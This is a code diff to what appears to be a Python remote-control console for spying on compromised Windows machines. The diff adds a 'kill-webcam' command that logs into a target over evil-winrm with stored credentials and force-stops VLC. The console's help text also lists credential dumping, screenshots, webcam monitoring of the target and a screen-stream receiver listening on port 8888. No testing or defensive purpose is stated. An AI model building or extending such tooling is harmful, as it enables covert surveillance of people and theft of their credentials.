@@ -240,6 +240,27 @@ def webcam(target_ip):
     except Exception as e:
         print(f"[-] Failed to trigger task: {e}")
 
+def kill_webcam(target_ip):
+    print(f"[*] Killing VLC process on {target_ip} ...")
+    payload = (
+        'Get-Process vlc -ErrorAction SilentlyContinue | '
+        'Stop-Process -Force'
+    )
+    try:
+        result = subprocess.run(
+            ["evil-winrm", "-i", target_ip, "-u", USERNAME, "-p", PASSWORD],
+            input=payload + "\nexit\n",
+            text=True,
+            capture_output=True,
+            timeout=15
+        )
+        if result.returncode == 0:
+            print("[+] VLC processes terminated successfully")
+        else:
+            print(f"[-] evil-winrm error:\n{result.stderr}")
+    except Exception as e:
+        print(f"[-] Failed to stop process: {e}")
+
 def screen_stream():
     print("[*] Starting screen stream receiver...")
     print("[*] Listening for incoming DXGI screen stream on port 8888...")
@@ -268,6 +289,7 @@ def cli():
         screen-shot    Take screenshot
         dump           Credentials dump
         webcam         Monitor the webcam on target
+        kill-webcam    Stop VLC webcam process on target
         screen-stream  Receive DXGI screen stream from target
         exit, q        Exit the console
     """
@@ -330,6 +352,12 @@ def cli():
                 print("[-] No target connected. Use 'listen' first.")
             else:
                 webcam(current_target)
+        
+        elif cmd == "kill-webcam":
+            if not current_target:
+                print("[-] No target connected. Use 'listen' first.")
+            else:
+                kill_webcam(current_target)
         
         elif cmd == "screen-stream":
             screen_stream()
